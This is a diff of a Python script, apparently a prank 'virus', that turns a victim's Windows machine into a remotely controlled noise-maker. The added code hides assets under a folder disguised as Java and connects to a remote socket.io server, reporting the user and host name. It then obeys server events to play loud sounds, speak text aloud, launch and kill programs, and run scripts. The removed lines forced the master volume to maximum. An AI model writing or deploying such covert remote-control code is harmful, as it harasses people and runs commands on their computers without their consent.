@@ -1,30 +1,49 @@
 import os
-import time
-import json
 import socket
 import getpass
-import requests
 import winsound
-from comtypes import CLSCTX_ALL
-from ctypes import cast, POINTER
-from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+import subprocess
+import gtts
+import playsound
+import socketio
 
+io = socketio.Client()
 username = getpass.getuser() + "@" + socket.gethostname()
-options = json.loads(requests.get("https://cactusvirus2000.quentinaniere.repl.co/API/login/" + username).text)
 
-if options["isStartingEarrapeActive"] == "true":
+soundbox_path = os.getenv("APPDATA")  + r"\Java\assets\Soundbox\\"
+goose_path = os.getenv("APPDATA")  + r"\Java\assets\Goose\\"
+flash_path = os.getenv("APPDATA")  + r"\Java\assets\FlashCoucou\\"
+soundlist = ["nopal-earrape", "passe-partout", "rene-ballek", "tabarnak", "wii-sport", "pauvre-conne", "patrick-ftg", "losing-horn", "titanic", "nani", "meuh", "fbi", "bien-evidement", "fanta-decision", "padami", "ntm", "spiderman", "colère"]
+flash_coucou = ["flash-jfp", "flash-blanquer", "flash-michel", "flash-jpk"]
 
-    devices = AudioUtilities.GetSpeakers()
-    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-    volume = cast(interface, POINTER(IAudioEndpointVolume))
-    volume.SetMasterVolumeLevel(-0.0, None) #Put the max volume
+@io.on("event-launched")
+def event_triggered(data):
 
-    time.sleep(float(options["delayBeforePlaying"]))
-    winsound.PlaySound(os.getenv("APPDATA") + r"\assets\nopal_earrape.wav", winsound.SND_ASYNC)
+    print(data)
+    if data["event"] in soundlist and data["user"] == username:
+        winsound.PlaySound(soundbox_path + data["event"] + ".wav", winsound.SND_ASYNC)
+    
+    elif data["event"] == "stop" and data["user"] == username:
+        winsound.PlaySound(None, winsound.SND_PURGE)
 
-    time.sleep(float(options["playingtime"]))
-    winsound.PlaySound(None, 0)
+    elif data["event"] == "spawn" and data["user"] == username:
+        DETACHED_PROCESS = 0x00000008
+        subprocess.call(goose_path + "GooseDesktop.exe", creationflags=DETACHED_PROCESS)
 
-while True:
-    options = json.loads(requests.get("https://cactusvirus2000.quentinaniere.repl.co/API/fetch/getUserOptions/" + username + "/true").text)
-    time.sleep(1)
+    elif data["event"] == "kill" and data["user"] == username:
+        os.system("taskkill/f /im goosedesktop.exe")
+
+    elif data["event"] in flash_coucou and data["user"] == username:
+        DETACHED_PROCESS = 0x00000008
+        subprocess.call(f"python {flash_path}\FlashCoucou.pyw {flash_path} {data['event']}", creationflags=DETACHED_PROCESS)
+
+    elif "tts\n" in data["event"] and data["user"] == username:
+        sentence = data["event"].split("\n")[1]
+        tts = gtts.gTTS(sentence, lang="fr")
+        tts.save("sentence.mp3")
+        playsound.playsound("sentence.mp3")
+        os.remove("sentence.mp3")
+
+
+io.connect("https://cactusvirus.quentinaniere.repl.co/:3000")
+io.emit("login", username)
